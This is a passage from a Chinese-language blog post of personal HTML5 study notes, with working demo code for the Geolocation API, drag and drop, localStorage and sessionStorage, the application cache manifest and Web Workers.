punctuation">"</span>getLocation()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>试一下<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"geolocation_demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">.</span><span class="token function">getCurrentPosition</span><span class="token punctuation">(</span>showPosition<span class="token punctuation">,</span> showError<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Geolocation is not supported by this browser."</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showPosition</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Latitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>latitude <span class="token operator">+</span>             <span class="token string">"&lt;br />Longitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>longitude<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span>code<span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>PERMISSION_DENIED<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"User denied the request for Geolocation."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>POSITION_UNAVAILABLE<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Location information is unavailable."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"The request to get user location timed out."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>UNKNOWN_ERROR<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"An unknown error occurred."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p id="geolocation_demo">点击这个按钮，将显示您的坐标：</p><button onclick="getLocation()">试一下</button><script>    var x=document.getElementById("geolocation_demo");    function getLocation()    {        if (navigator.geolocation)        {            navigator.geolocation.getCurrentPosition(showPosition, showError);        }        else{x.innerHTML="Geolocation is not supported by this browser.";}    }    function showPosition(position)    {        x.innerHTML="Latitude: " + position.coords.latitude +             "<br />Longitude: " + position.coords.longitude;        }    function showError(error)    {        switch(error.code)         {            case error.PERMISSION_DENIED:                x.innerHTML="User denied the request for Geolocation."                break;            case error.POSITION_UNAVAILABLE:                x.innerHTML="Location information is unavailable."                break;            case error.TIMEOUT:                x.innerHTML="The request to get user location timed out."                break;            case error.UNKNOWN_ERROR:                x.innerHTML="An unknown error occurred."                break;        }    }</script><br><p>如需<strong>在地图中显示结果</strong>，可以调用谷歌地图、百度地图等地图的API。</p><p>还有一些其他的方法：</p><p><strong>watchPosition()</strong> </p><p>返回用户的当前位置，并继续返回用户移动时的更新位置（类似于 GPS）。</p><p><strong>clearWatch()</strong> </p><p>停止 watchPosition() 方法。</p><hr><h2 id="拖放"><a href="#拖放" class="headerlink" title="拖放"></a>拖放</h2><p>拖放（Drag 和 Drop）指的是抓取某物并拖入不同的位置。</p><p>HTML5 中任何元素都是可拖放的。</p><p><em>（这里我还不是很明白，后面具体看看 JavaScript 的时候再回来看一看</em></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token id">#divmiao1</span> </span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">200</span>px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">10</span>px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#aaaaaa</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">allowDrop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drag</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">,</span>ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> data<span class="token operator">=</span>ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>请把图片拖放到矩形中：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>divmiao1<span class="token punctuation">"</span></span> <span class="token attr-name">ondrop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drop(event)<span class="token punctuation">"</span></span> <span class="token attr-name">ondragover</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>allowDrop(event)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drag1<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>FrontEnd_HTML_Advanced/start_again.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">draggable</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">ondragstart</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>drag(event)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><style type="text/css">    #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;}</style><script type="text/javascript">    function allowDrop(ev)    {        ev.preventDefault();    }    function drag(ev)    {        ev.dataTransfer.setData("Text",ev.target.id);    }    function drop(ev)    {        ev.preventDefault();        var data=ev.dataTransfer.getData("Text");        ev.target.appendChild(document.getElementById(data));    }</script><p>请把图片拖放到矩形中：</p><div id="divmiao1" ondrop="drop(event)" ondragover="allowDrop(event)"></div><br><img id="drag1" src="/2020/02/18/FrontEnd_HTML_Advanced/start_again.jpg" draggable="true" ondragstart="drag(event)"><br><h3 id="draggable"><a href="#draggable" class="headerlink" title="draggable"></a>draggable</h3><p>首先需要把想要拖动的元素新增一个 <code>draggable</code> 属性，即 <code>&lt;img draggable="true"&gt;</code>。</p><p>然后，规定当元素被拖动时发生的事情。</p><h3 id="ondragstart"><a href="#ondragstart" class="headerlink" title="ondragstart"></a>ondragstart</h3><p><code>ondragstart</code> 属性调用了一个 <code>drag(event)</code> 函数，规定拖动什么数据。</p><p>dataTransfer.setData() 方法设置被拖动数据的数据类型和值。这里的数据类型是 “text”，而值是这个可拖动元素的 id (“drag1”)。</p><h3 id="ondragover"><a href="#ondragover" class="headerlink" title="ondragover"></a>ondragover</h3><p><code>ondragover</code> 事件规定被拖动的数据能够被放置到何处。</p><p>默认地，数据/元素无法被放置到其他元素中。为了实现拖放，我们必须阻止元素的这种默认的处理方式。</p><p>这个任务由 ondragover 事件的 event.preventDefault() 方法完成。</p><h3 id="ondrop"><a href="#ondrop" class="headerlink" title="ondrop"></a>ondrop</h3><p>当放开被拖数据时，会发生 drop 事件。</p><p>在上面的例子中，ondrop 属性调用了一个函数，drop(event)。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>调用 <code>preventDefault()</code> 来阻止数据的浏览器默认处理方式（drop 事件的默认行为是以链接形式打开）</li><li>通过 <code>dataTransfer.getData()</code> 方法获得被拖的数据。该方法将返回在 <code>setData()</code> 方法中设置为相同类型的任何数据</li><li>被拖数据是被拖元素的 id (“drag1”)</li><li>把被拖元素追加到放置元素中</li></ul><br><hr><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><p>通过本地存储<em>（Local Storage）</em>，web 应用程序能够在用户浏览器中对数据进行本地的存储。</p><p>在 HTML5 之前，应用程序数据只能存储在 cookie 中，包括每个服务器请求。</p><p>本地存储则更安全，并且可在不影响网站性能的前提下将大量数据存储于本地。</p><p>与 cookie 不同，存储限制要大得多（至少5MB），并且信息不会被传输到服务器。</p><br><p>HTML 本地存储提供了两个在客户端存储数据的对象：</p><ul><li>window.localStorage - <strong>存储没有截止日期的数据</strong>，当浏览器被关闭时数据<strong>不会被删除</strong></li><li>window.sessionStorage - 针对一个 <strong>session</strong> 来存储数据，当关闭浏览器标签页时<strong>数据会丢失</strong></li></ul><h3 id="localStorage-对象"><a href="#localStorage-对象" class="headerlink" title="localStorage 对象"></a>localStorage 对象</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test_result<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token comment" spellcheck="true">// Check browser support</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 存储 Store</span>    localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">,</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 取回 Retrieve</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"website"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><div id="test_result"></div><script>// Check browser supportif (typeof(Storage) !== "undefined") {    // 存储 Store    localStorage.setItem("website", "https://miaotony.xyz");    // 取回 Retrieve    document.getElementById("test_result").innerHTML = localStorage.getItem("website");} else {    document.getElementById("test_result").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";}</script><br><p>首先创建 localStorage 名称/值对，其中：name=”website”，value=”<a href="https://miaotony.xyz&quot;">https://miaotony.xyz"</a></p><p>而后取回 “website” 的值，并把它插到 id=”test_result” 的元素中。</p><p>也可以把名称作为一个属性来使用，比如：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 存储</span>localStorage<span class="token punctuation">.</span>website <span class="token operator">=</span> <span class="token string">"https://miaotony.xyz"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 取回</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test_result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> localStorage<span class="token punctuation">.</span>website<span class="token punctuation">;</span></code></pre><p><strong>删除</strong>某一 localStorage 项目的语法：</p><pre class=" language-JavaScript"><code class="language-JavaScript">localStorage.removeItem("website");</code></pre><p>名称/值对<strong>始终存储为字符串</strong>。如果需要请记得把它们转换为其他格式！</p><p>下面这个对用户点击按钮的次数进行计数。在代码中，值字符串被转换为数值，依次对计数进行递增：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"您已经点击这个按钮 "</span> <span class="token operator">+</span> localStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" 次。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clickCounter1()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请点击这里！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><script>function clickCounter1() {    if(typeof(Storage) !== "undefined") {        if (localStorage.clickcount) {            localStorage.clickcount = Number(localStorage.clickcount)+1;        } else {            localStorage.clickcount = 1;        }        document.getElementById("result2").innerHTML = "您已经点击这个按钮 " + localStorage.clickcount + " 次。";    } else {        document.getElementById("result2").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";    }}</script><p><button onclick="clickCounter1()" type="button">请点击这里！</button></p><br><div id="result2"></div><br><p>点击之后计数器将递增，且关闭这个网页/浏览器再打开这个页面，数字会从上一次的位置递增，<strong>不会重置</strong>。</p><h3 id="sessionStorage-对象"><a href="#sessionStorage-对象" class="headerlink" title="sessionStorage 对象"></a>sessionStorage 对象</h3><p>sessionStorage 对象等同 localStorage 对象，不同之处在于<strong>只对一个 session 存储数据</strong>。如果用户关闭具体的浏览器标签页，<strong>数据也会被删除</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">function</span> <span class="token function">clickCounter2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Storage<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span>clickcount<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"在本 session 中，您已经点击这个按钮 "</span> <span class="token operator">+</span> sessionStorage<span class="token punctuation">.</span>clickcount <span class="token operator">+</span> <span class="token string">" 次。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"抱歉！您的浏览器不支持 Web Storage ..."</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clickCounter2()<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请点击这里<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>result3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><script>function clickCounter2() {    if(typeof(Storage) !== "undefined") {        if (sessionStorage.clickcount) {            sessionStorage.clickcount = Number(sessionStorage.clickcount)+1;        } else {            sessionStorage.clickcount = 1;        }        document.getElementById("result3").innerHTML = "在本 session 中，您已经点击这个按钮 " + sessionStorage.clickcount + " 次。";    } else {        document.getElementById("result3").innerHTML = "抱歉！您的浏览器不支持 Web Storage ...";    }}</script><p><button onclick="clickCounter2()" type="button">请点击这里</button></p><br><div id="result3"></div><br><p>点击之后计数器也将递增，但是关闭这个网页/浏览器再打开这个页面，数字不会从上一次的位置递增，<strong>直接重置</strong>。</p><p>当然，刷新的话还是同一个 session，所以还是保留的。</p><p>按下 F12，在<strong>存储</strong>里也可以看得到<strong>会话存储</strong>和<strong>本地存储</strong>。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/sessionStorage.png" alt="sessionStorage"></p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/localStorage.png" alt="localStorage"></p><br><hr><h2 id="应用程序缓存"><a href="#应用程序缓存" class="headerlink" title="应用程序缓存"></a>应用程序缓存</h2><p><strong>使用应用程序缓存<em>（Application Cache）</em>，通过创建 cache manifest 文件，可轻松创建 web 应用的离线版本。</strong></p><h3 id="Cache-Manifest-基础"><a href="#Cache-Manifest-基础" class="headerlink" title="Cache Manifest 基础"></a>Cache Manifest 基础</h3><p>如需启用应用程序缓存，需要在文档的 <code>&lt;html&gt;</code> 标签中包含 <code>manifest</code> 属性。</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE HTML></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">manifest</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo.appcache<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。</p><p>manifest 文件的建议文件扩展名是：”.appcache”。</p><p>manifest 文件需要设置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。</p><h3 id="Manifest-文件"><a href="#Manifest-文件" class="headerlink" title="Manifest 文件"></a>Manifest 文件</h3><p>manifest 文件是简单的文本文件，用来告知浏览器被缓存的内容（以及不缓存的内容）。</p><p>包含三个部分：</p><ul><li>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存</li><li>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存</li><li>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）</li></ul><p>完整范例：</p><pre><code>CACHE MANIFEST# 2020-02-20 v1.0.0/theme.css/logo.gif/main.jsNETWORK:*FALLBACK:/html/ /offline.html</code></pre><p>第一行，<code>CACHE MANIFEST</code>，是必需的。</p><p><code>NETWORK</code> 中，可以使用星号来指示所有其他其他资源/文件都需要联网。</p><p><code>FALLBACK</code> 中，规定如果无法建立因特网连接，则用 “offline.html” 替代 /html/ 目录中的所有文件。</p><p>一旦应用被缓存，它就会保持缓存，更新缓存有以下这几种情况。</p><ul><li>用户清空浏览器缓存</li><li>manifest 文件被修改</li><li>由程序来更新应用缓存</li></ul><p>以 “#” 开头的是注释行，但也可满足其他用途。应用的缓存只会在其 manifest 文件改变时被更新。</p><p>更新注释行中的日期和版本号就可以让浏览器重新缓存文件。</p><br><hr><h2 id="Web-Workers"><a href="#Web-Workers" class="headerlink" title="Web Workers"></a>Web Workers</h2><p>Web worker 是运行在后台的 JavaScript，不会影响页面的性能。</p><p>当在 HTML 页面中执行脚本时，在脚本执行结束之前页面是不可响应的。使用 Web worker 就可以独立于其他脚本来在后台执行，前台照样可以进行点击、选取内容等等操作。</p><p>通常用于耗费 CPU 资源的任务。</p><p>由于 web worker 位于外部文件中，它们无法访问下例 JavaScript 对象：</p><ul><li>window 对象</li><li>document 对象</li><li>parent 对象</li></ul><p>首先需要<strong>创建一个 web worker 文件</strong>，比如这里创建了一个计数的脚本。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">postMessage</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"timedCount()"</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">timedCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中的 <code>postMessage()</code> 方法<strong>用于向 HTML 页面传回一段消息</strong>。</p><p>而后在 HTML 中<strong>创建一个 Web Worker 对象</strong>，运行上面文件中的代码。</p><pre class=" language-javascript"><code class="language-javascript">w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">"demo_workers.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后让 Web Worker 监听 <code>onmessage</code> 事件。</p><p>当 web worker 传送消息时，会执行事件监听器中的代码。来自 web worker 的数据会存储于 event.data 中。</p><pre class=" language-javascript"><code class="language-javascript">w<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>创建 web worker 后，它会继续监听消息（即使在外部脚本完成后）直到其被终止为止。</p><p>需要终止这个 web worker，并释放浏览器/计算机资源，可以使用 terminate() 方法。</p><p>终止后再将原来的变量（w）设置为 